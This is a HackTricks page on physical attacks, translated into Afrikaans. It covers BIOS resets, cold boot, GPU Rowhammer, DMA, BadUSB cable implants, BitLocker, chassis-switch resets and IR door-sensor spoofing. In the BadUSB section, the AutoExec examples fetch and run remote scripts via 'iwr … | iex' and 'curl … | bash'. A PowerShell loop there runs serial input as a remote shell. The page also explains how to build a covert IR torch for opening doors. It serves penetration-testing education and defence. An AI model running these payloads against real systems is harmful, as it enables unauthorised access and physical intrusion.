# Fisiese Aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherwinning en Stelselsekuriteit

Verouderde PC-firmware-instellings kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde clear-CMOS-jumper te gebruik. Die nodige afskakeltyd is bordspesifiek, en moderne UEFI-wagwoorde of -sleutels kan in nie-vlugtige flash-geheue, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor word en daarom bly bestaan nadat ’n battery verwyder is. Raadpleeg die bord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyf-enkripsieherwinning aktiveer.

Op verouderde x86-stelsels kan tools soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing inspekteer of wysig. CmosPwd herken wagwoordformate uit ’n gedokumenteerde stel ouer BIOS-families en kan CMOS-toestand rugsteun, herstel of uitvee/kill; die gepubliseerde builds teiken verouderde DOS/Windows-, Linux-, FreeBSD- en NetBSD-omgewings.<sup>[[18]](#references)</sup> Hierdie utilities is nie generiese UEFI-wagwoordverwyderaars nie en vereis voldoende hardeware-/firmwaretoegang.

Sommige skootrekenaarfirmware wys ’n verskafferspesifieke uitdagingskode nadat verskeie mislukte wagwoordpogings aangewend is. Databasisse soos [bios-pw.org](https://bios-pw.org) kan verouderde verskaffer-herstelwagwoorde vir sommige modelle aflei, maar baie stelsels implementeer uitsluiting sonder ’n afleibare uitdaging. Behandel enige gegenereerde wagwoord as modelspesifiek en vermy die uitputting van permanente pogingtellers.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskerming oudit. Begin met die nie-wysigende kontrole hieronder; die opsionele `-a modify`-modus probeer doelbewus veranderlikes korrupteer en moet slegs op ’n herstelbare laboratoriumstelsel gebruik word. CHIPSEC waarsku self dat sy bevoorregte drywer en laevlak-hardewaretoegang nie geskik is vir produksie-eindpunte nie.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM-analise en Cold Boot-aanvalle

DRAM verloor nie elke bis onmiddellik wanneer refresh stop nie. Die vervaltempo wissel aansienlik volgens module-tegnologie en temperatuur; afkoeling kan bruikbare data baie langer bewaar as ’n onafgekoelde kragsiklus. ’n Cold-boot-aanval herlaai vinnig na ’n klein acquisition-omgewing of dra ’n afgekoelde module oor, vang rou geheue vas, en rekonstrueer kriptografiese sleutels ondanks bit-verval. ’n Disk-copy-nutsprogram is nie outomaties ’n physical-memory imager nie, en Volatility ontleed ’n capture eerder as om dit te verkry; gebruik ’n platformgeskikte, gevalideerde acquisition tool.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen Page Tables

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU virtual-memory metadata** teiken in plaas van gewone buffers. Onlangse navorsing oor **GDDR6 NVIDIA Ampere GPUs** toon dat ’n aanvaller wat onbevoorregte CUDA-kode uitvoer, GPU-spesifieke hammering-patrone kan bou, **memory massaging** kan gebruik om paging structures in kwesbare rye te plaas, en dan bisse in die **last-level page table** of ’n intermediêre **page directory** kan omkeer. Sodra ’n enkele translation entry beskadig is, kan die aanvaller **arbitrary GPU memory read/write** verkry en daarna na host compromise oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 en bou refresh-aware / non-uniform hammering-patrone wat in-DRAM-mitigations omseil.
2. **Massage GPU allocations** sodat die driver page-translation structures in hammerable fisiese liggings plaas, in plaas daarvan om dit in die verstek-beskermde pool te hou. In die praktyk kan dit beteken dat die low-memory page-table region uitgeput word en groot sparse UVM mappings met beheerde strides gesproei word.
3. **Flip translation metadata** soos **PFN** of aperture-related bits binne ’n page-table / page-directory entry sodat die aanvaller-beheerde virtuele bladsy na page-table pages, arbitrary GPU memory, of host-visible system mappings resolve.
4. Hergebruik die vervalste mapping om bykomende translation entries te herskryf en eskaleer na **arbitrary GPU memory read/write** oor GPU contexts.

### Host Pivot en Mitigations

- Met **IOMMU disabled** kan vervalste system-aperture mappings arbitrary **host physical memory** aan die GPU blootstel, wat die GPU primitive in volledige host compromise verander.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken last-level page-table entries, terwyl **GeForge** toon dat die beskadiging van ’n page-directory level makliker kan wees omdat een bit flip ’n groter translation subtree kan herteiken. Moenie slegs een paging layer as security-critical beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bly belangrik omdat dit die direkte arbitrary-host-memory path blokkeer wat deur GDDRHammer/GeForge gebruik word, maar dit is **not a complete mitigation**. **GPUBreach** toon ’n second-stage pivot waar die aanvaller GPU-writable, driver-owned CPU buffers beskadig en daarna NVIDIA driver memory-safety bugs aktiveer om ’n kernel write primitive en ’n **root shell** te verkry, selfs met IOMMU enabled.<sup>[[3]](#references)</sup>
- **System-level ECC** is ’n praktiese hardening step op ondersteunde workstation/server GPUs. Consumer GPUs sonder ECC stel ’n swakker defense surface bloot.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bit flips op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, wat genoeg was om ’n werkende host-privilege-escalation chain te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)-aanvalle

**Inception** demonstreer **DMA-based memory acquisition and patching** oor koppelvlakke soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese login-bypass signatures. Dit is nie bloot “ineffektief teen Windows 10” nie: exploitability hang af van die koppelvlak, target build, IOMMU policy, lock state, en of Windows Kernel DMA Protection ondersteun en enabled is. Windows 10 version 1803 en later het Kernel DMA Protection op versoenbare platforms bekendgestel, wat die attack surface aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir System Access

Op ’n ongeënkripteerde of reeds ontsluite Windows-volume kan ’n offline-omgewing accessibility binaries soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat ’n SYSTEM command prompt lewer wanneer die ooreenstemmende logon-screen shortcut uitgevoer word. Tools soos **chntpw** kan plaaslike SAM-accountdata wysig. Hierdie metodes omseil nie ’n geslote BitLocker-volume nie en kan credentials wat deur DPAPI/EFS beskerm word, beskadig; bewaar forensiese kopieë en backups.

**Kon-Boot** is ’n kommersiële boot-time authentication-bypass tool vir ondersteunde Windows/macOS-konfigurasies. Verenigbaarheid hang af van die OS, firmware mode, Secure Boot en disk-encryption setup; dit decrypt nie ’n BitLocker-locked volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows Security Features

### Boot en Recovery Shortcuts

- **Delete/Supr**, F2, F10, of ’n ander vendor key kan firmware setup oopmaak.
- **F8** betree slegs legacy Windows advanced boot options op konfigurasies waar daardie pad steeds enabled is; huidige recovery entry wissel.
- Om **Shift** in te hou kan Windows automatic logon in sommige konfigurasies onderdruk, hoewel policy/registry settings daardie gedrag kan disable.<sup>[[17]](#references)</sup>

### BAD USB Devices

Devices soos **USB Rubber Ducky** en Teensy-borde kan as trusted HID keyboards enumerate en voorafgedefinieerde keystrokes inject. Die payload het aanvanklik die privileges en desktop access van die logged-on session; UAC-prompts, screen locking, keyboard layout, timing en endpoint USB policy beperk dit steeds.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator- of backup-privileges kan ’n shadow copy skep of registry hives stoor sodat locked files soos **SAM** en **SYSTEM** verkry kan word. Dit is ’n post-compromise collection technique, nie ’n privilege bypass nie, en behoort met `diskshadow`/VSS- en registry-hive export events gekorreleer te word.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3-gebaseerde implants soos **Evil Crow Cable Wind** verberg binne USB-A→USB-C- of USB-C↔USB-C-kabels, enumerate uitsluitlik as ’n USB-keyboard, en stel hul C2-stack oor Wi-Fi bloot. Die operator hoef slegs die cable vanaf die victim host van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te browse om die ingebedde HTTP-interface te bereik.<sup>[[8]](#references)</sup>
- Die browser UI verskaf tabs vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoor payloads word per OS getag, keyboard layouts word on the fly gewissel, en VID/PID strings kan verander word om bekende peripherals na te boots.
- Omdat die C2 binne die cable woon, kan ’n phone payloads stage, execution trigger en Wi-Fi credentials manage sonder om die organisasie se network te gebruik—nuttig vir physical intrusions met ’n kort dwell-time.

### OS-aware AutoExec payloads

- AutoExec rules bind een of meer payloads om onmiddellik ná USB enumeration af te vuur. Die implant voer liggewig OS fingerprinting uit en kies die passende script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat execution unattended is, kan die eenvoudige omruiling van ’n charging cable “plug-and-pwn” initial access onder die logged-on user context bewerkstellig.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** ’n Gestoor payload open ’n console en plak ’n loop wat enigiets uitvoer wat op die nuwe USB-serial device aankom. ’n Minimale Windows-variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python script, Android APK of desktop executable) na die operateur begin. Enige grepe wat in die TCP-sessie getik word, word na die serial-lus hierbo aangestuur, wat remote command execution selfs op air-gapped gashere moontlik maak. Uitvoer is beperk, dus voer operateurs gewoonlik blind commands uit (rekeningcreating, die staging van bykomende tooling, ens.).

### HTTP OTA-opdateringsoppervlak

- Die gedokumenteerde Evil Crow Cable Wind-koppelvlak stel ’n unauthenticated firmware-update endpoint by `/update` bloot:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Veldoperateurs kan kenmerke midde-in ’n engagement hot-swap (bv. die flash USB Army Knife-firmware) sonder om die kabel oop te maak, sodat die implant na nuwe vermoëns kan oorskakel terwyl dit steeds by die teikenhost ingeprop is.

## Om BitLocker-enkripsie te omseil

’n Gemagtigde forensiese verkryging van ’n aktiewe of onlangs lopende stelsel kan ’n BitLocker-volumehoofsleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële tools soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan ondersteunde geheuebeelde, hibernasielêers of crash dumps deursoek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook crash dumps wanneer BitLocker geaktiveer is, en ’n gestoorde 48-syfer recovery password is ’n ander artefak as ’n volume-sleutel wat in die geheue is.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering vir die byvoeging van ’n Recovery Key

’n Aanvaller wat ’n administrateur oorreed om BitLocker-bestuursopdragte uit te voer, kan ’n recovery-password-, external-key- of ander protector byvoeg en dit dan vaslê. ’n Recovery password kan nie ’n arbitrêre string nulle wees nie: BitLocker-numeriese recovery passwords het ’n gevalideerde 48-syferformaat. Die relevante gemagtigde administrasiesintaksis is `manage-bde -protectors -add C: -recoverypassword`; lys die gevolglike protectors met `manage-bde -protectors -get C:`. Monitor die byvoeging van protectors en verseker dat nuwe recovery-materiaal slegs na goedgekeurde liggings escrow word.<sup>[[16]](#references)</sup>

---

## Uitbuiting van Chassis Intrusion / Maintenance Switches om die BIOS na fabrieksinstellings terug te stel

Baie moderne skootrekenaars en desktops met ’n klein vormfaktor bevat ’n **chassis-intrusion switch** wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die primêre doel van die switch is om ’n waarskuwing te aktiveer wanneer ’n toestel oopgemaak word, implementeer vervaardigers soms ’n **ongedokumenteerde recovery shortcut** wat geaktiveer word wanneer die switch in ’n spesifieke patroon gewissel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die Aanval Werk

1. Die switch is aan ’n **GPIO-interrupt** op die EC gekoppel.
2. Firmware wat op die EC loop, hou rekord van die **tydsberekening en aantal drukke**.
3. Wanneer ’n hardgekodeerde patroon herken word, roep die EC ’n *mainboard-reset*-roetine aan wat die **inhoud van die stelsel se NVRAM/CMOS uitvee**.
4. Met die volgende selflaai laai die betrokke modelle die teruggestelde firmwaretoestand. Afhangend van die vervaardiger en hersiening, kan die skoongemaakte toestand ’n supervisor password, pasgemaakte selflaai-instellings of ingeskrewe Secure Boot-sleutels insluit; TPM-toestand en skyf-enkripsie-effekte moet afsonderlik beoordeel word.

> ’n Firmware-reset kan external-boot-opsies herstel, maar dit **dekripteer nie berging nie**. BitLocker of ’n ander full-disk-encryption-stelsel kan recovery aktiveer ná veranderinge aan die TPM/firmware en steeds die interne skyf beskerm sonder ’n recovery key.<sup>[[16]](#references)</sup>

### Werklike Voorbeeld – Framework 13-skootrekenaar

Die recovery shortcut vir die Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Na die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM tydens die volgende herlaai uit te vee. Die hele prosedure neem ~40 s en vereis **niks meer as ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. Skakel die teiken aan of voer ’n opskort-herneem-aksie uit sodat die EC loop.
2. Verwyder die onderste deksel om die intrusion/maintenance switch bloot te lê.
3. Herhaal die verskafferspesifieke skakelpatroon (raadpleeg dokumentasie, forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai, en ondersoek dan watter firmware-instellings en credentials werklik verander het.
5. Indien gemagtig en eksterne boot beskikbaar is, boot ’n beheerde live image. Sodra ’n interne volume wettig ontsluit is (of indien dit nooit geënkripteer was nie), kan die live-omgewing credentials en data verkry of die EFI System Partition inspekteer. Die wysiging van daardie partisie om ’n EFI implant te installeer, is persistent en hoogs indringend, en bly beperk deur Secure Boot, measured boot, firmware write protection en endpoint monitoring. Geënkripteerde storage bly ontoeganklik sonder die sleutel of recovery material.

### Detection & Mitigation

* Teken chassis-intrusion-gebeurtenisse in die OS management console aan en korreleer dit met onverwagte BIOS-resets.
* Gebruik **tamper-evident seals** op skroewe/deksels om opening op te spoor.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat physical access gelykstaande is aan ’n volledige compromise.
* Waar beskikbaar, deaktiveer die verskaffer se “maintenance switch reset”-funksie of vereis addisionele kriptografiese authorisation vir NVRAM-resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Kommoditeits-“wave-to-exit”-sensors koppel ’n near-IR LED-emitter aan ’n TV-remote-styl receiver-module wat slegs logic high rapporteer nadat dit veelvuldige pulse (~4–10) van die korrekte carrier (≈30 kHz) waargeneem het.<sup>[[7]](#references)</sup>
- ’n Plastiekshroud keer dat die emitter en receiver direk na mekaar kyk, sodat die controller aanvaar dat enige gevalideerde carrier van ’n nabygeleë refleksie afkomstig is en ’n relay aandryf wat die door strike oopmaak.
- Sodra die controller glo dat ’n teiken teenwoordig is, verander dit dikwels die outbound modulation envelope, maar die receiver aanvaar steeds enige burst wat by die gefiltreerde carrier pas.

### Attack Workflow
1. **Capture the emission profile** – koppel ’n logic analyser oor die controller-pins om beide die pre-detection- en post-detection-waveforms op te neem wat die interne IR LED aandryf.
2. **Replay only the “post-detection” waveform** – verwyder of ignoreer die standaard-emitter en dryf ’n eksterne IR LED aan met die reeds geaktiveerde patroon vanaf die begin. Omdat die receiver slegs omgee vir pulstelling/frekwensie, behandel dit die gespoofte carrier as ’n egte refleksie en aktiveer dit die relay line.
3. **Gate the transmission** – stuur die carrier in ingestelde bursts (bv. tiene millisekondes aan, soortgelyke tyd af) om die minimum pulstelling te lewer sonder om die receiver se AGC of interference-handling logic te versadig. Deurlopende emissie desensitiseer die sensor vinnig en keer dat die relay aktiveer.

### Long-Range Reflective Injection
- Deur die bench LED met ’n hoëkrag-IR-diode, MOSFET-driver en focusing optics te vervang, kan betroubare triggering vanaf ~6 m moontlik gemaak word.
- Die aanvaller benodig nie line-of-sight na die receiver-aperture nie; deur die beam op binnemure, rakke of door frames te rig wat deur glas sigbaar is, kan gereflekteerde energy die ~30°-field of view binnegaan en ’n nabyafstand-handwave naboots.
- Omdat die receivers slegs swak refleksies verwag, kan ’n veel sterker eksterne beam van verskeie oppervlaktes afkaats en steeds bo die detection threshold bly.

### Weaponised Attack Torch
- Deur die driver binne ’n kommersiële flashlight te versteek, word die tool in plain sight weggesteek. Vervang die sigbare LED met ’n hoëkrag-IR LED wat by die receiver se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-bursts te genereer, en gebruik ’n MOSFET om die LED-stroom te sink.
- ’n Telescopic zoom lens vernou die beam vir range/precision, terwyl ’n vibration motor onder MCU-beheer haptic confirmation gee dat modulation aktief is sonder om sigbare lig uit te stuur.
- Deur tussen verskeie gestoorde modulation patterns te siklus (effens verskillende carrier-frekwensies en envelopes), word compatibility oor herverkoopte sensorfamilies verhoog, sodat die operator reflektiewe oppervlaktes kan sweep totdat die relay hoorbaar klik en die deur loslaat.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om te pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir Mainboard Reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Neeeee, geen aanraking nie! – Om IR No-Touch Exit Sensors met ’n Covert IR Torch te omseil”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Prop in, speel, pwn: Hacking met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
